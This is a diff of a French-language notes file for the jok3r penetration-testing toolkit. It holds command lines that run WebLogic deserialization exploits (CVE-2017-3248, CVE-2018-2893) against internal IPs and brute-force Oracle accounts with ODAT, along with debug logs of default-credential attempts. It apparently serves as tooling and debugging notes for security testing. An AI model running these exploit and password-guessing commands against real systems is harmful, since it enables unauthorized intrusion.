@@ -108,8 +108,15 @@ CHECKS CORRECTIONS
 /jok3r/toolbox/http/exploit-weblogic-cve2017-3248# python2.7 exploits/weblogic/exploit-CVE-2017-3248-bobsecq.py -t 10.2.211.136 -p 443 --ssl --check --ysopath /root/jok3r/toolbox/multi/ysoserial/ysoserial-master.jar
 
 
-- Mettre /bin/bash -c pour utilisation de <<< + single quote !! dans :
-root@kali:~/jok3r/toolbox/http/exploit-weblogic-cve2018-2893# echo "[~] Will try to ping local IP = 10.250.58.108"; echo "[~] Running tcpdump in background..."; sudo sh -c "tcpdump -U -i any -w /tmp/dump.pcap icmp &" ; java -jar ysoserial-cve-2018-2893.jar JRMPClient4 "/bin/ping -c 4 10.250.58.108" > /tmp/poc4.ser; python2.7 weblogic.py 10.2.211.136 443 /tmp/poc4.ser; echo "[~] Wait a little bit..."; sleep 3; PID=$(ps -e | pgrep tcpdump); echo "[~] Kill tcpdump"; sudo kill -9 $PID; sleep 2; echo "[~] Captured ICMP traffic:"; echo; sudo tcpdump -r /tmp/dump.pcap; echo "[~] Delete capture"; sudo rm /tmp/dump.pcap; rm /tmp/poc4.ser
+ - autre bug:
+17:17:05 DEBUG -: Try to connect with APPLYSYSPUB/<UNKNOWN>
+17:17:05 DEBUG -: Oracle connection string: APPLYSYSPUB/<UNKNOWN>@10.190.98.115:1521/LISTENER
+17:17:05 DEBUG -: Error during connection with this account: `ORA-12514: TNS:listener does not currently know of service requested in connect descriptor`
+17:17:05 DEBUG -: Try to connect with APPS/APPS
+17:17:05 DEBUG -: Oracle connection string: APPS/APPS@10.190.98.115:1521/LISTENER
+=> correction:
+/bin/bash -c "export ORACLE_HOME=`file /usr/lib/oracle/*/client64/ | tail -n 1 | cut -d':' -f1`; export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:$ORACLE_HOME/lib; export PATH=$ORACLE_HOME/bin:$PATH; python2.7 odat.py passwordguesser -s 10.190.98.114 -p 1521 -d SCAN3 -vv --force-retry --accounts-file accounts/accounts_multiple.txt"
+
 
 -ODAT: simple quote après /bin/bash !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! (sinon $var non prise en compte)
 /bin/bash -c 'export ORACLE_HOME=`file /usr/lib/oracle/*/client64/ | tail -n 1 | cut -d":" -f1`; export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:$ORACLE_HOME/lib; export PATH=$ORACLE_HOME/bin:$PATH; echo $ORACLE_HOME; python2.7 odat.py passwordguesser -s 10.2.208.173 -p 1521 -d LISTENER -vv --force-retry --accounts-file accounts/accounts_multiple.txt'
@@ -230,29 +237,7 @@ TARGETURI => /
 
 
 
-- jok3r-script for oracle install:
 
-  - change url + reinstall
-  wget https://github.com/koutto/jok3r-scripts/raw/master/oracle/odat-dependencies/oracle-instantclient12.2-sqlplus_12.2.0.1.0-2_amd64.deb
-wget https://github.com/koutto/jok3r-scripts/raw/master/oracle/odat-dependencies/oracle-instantclient18.3-basic_18.3.0.0.0-2_amd64.deb
-wget https://github.com/koutto/jok3r-scripts/raw/master/oracle/odat-dependencies/oracle-instantclient18.3-devel_18.3.0.0.0-2_amd64.deb
-sudo dpkg -i oracle-instantclient18.3-basic_18.3.0.0.0-2_amd64.deb
-sudo dpkg -i oracle-instantclient12.2-sqlplus_12.2.0.1.0-2_amd64.deb
-
-- add in dockerfile:
-
-  export ORACLE_HOME=`file /usr/lib/oracle/*/client64/ | tail -n 1 | cut -d':' -f1`
-  export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:$ORACLE_HOME/lib
-  export PATH=$ORACLE_HOME/bin:$PATH
-  
- - autre bug:
-17:17:05 DEBUG -: Try to connect with APPLYSYSPUB/<UNKNOWN>
-17:17:05 DEBUG -: Oracle connection string: APPLYSYSPUB/<UNKNOWN>@10.190.98.115:1521/LISTENER
-17:17:05 DEBUG -: Error during connection with this account: `ORA-12514: TNS:listener does not currently know of service requested in connect descriptor`
-17:17:05 DEBUG -: Try to connect with APPS/APPS
-17:17:05 DEBUG -: Oracle connection string: APPS/APPS@10.190.98.115:1521/LISTENER
-=> correction:
-/bin/bash -c "export ORACLE_HOME=`file /usr/lib/oracle/*/client64/ | tail -n 1 | cut -d':' -f1`; export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:$ORACLE_HOME/lib; export PATH=$ORACLE_HOME/bin:$PATH; python2.7 odat.py passwordguesser -s 10.190.98.114 -p 1521 -d SCAN3 -vv --force-retry --accounts-file accounts/accounts_multiple.txt"
 
 
 
